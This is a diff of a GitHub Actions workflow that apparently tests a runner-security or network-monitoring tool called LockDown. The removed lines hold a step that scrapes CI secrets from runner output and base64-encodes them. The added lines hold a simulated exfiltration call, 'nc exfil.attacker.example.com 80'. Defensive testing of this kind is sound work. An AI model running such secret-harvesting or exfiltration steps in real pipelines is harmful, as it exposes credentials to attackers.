@@ -1,4 +1,4 @@
-name: LockDown-Runner-Worker
+name: LockDown--sus-network
 on:
   workflow_dispatch:
 
@@ -19,22 +19,25 @@ jobs:
       - name: Curl google
         run: "curl -s https://google.com"
 
-      - name: Execute tj-action
-        run: | 
-          sudo python3 armour/tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
+      - name: nc exfil.attacker.example.com 80 
+        run: nc exfil.attacker.example.com 80
+
+      - name: curl mitsubishielectric.com
+        if: always()
+        run: curl mitsubishielectric.com
                   
       - name: Curl youtube
+        if: always()
         run: "curl -s https://youtube.com"
 
-      - run: sleep 2
+      - name: sleep 2
+        if: always()
+        run: sleep 2
 
-      - run: ps auxf
+      - name: journal
+        if: always()
+        run: sudo journalctl -u agent --no-pager --all
 
-      - run: pidof Runner.Worker
-
-
-      - run: sudo journalctl -u agent
-      
       - name: Compress agent log
         if: always()
         continue-on-error: true
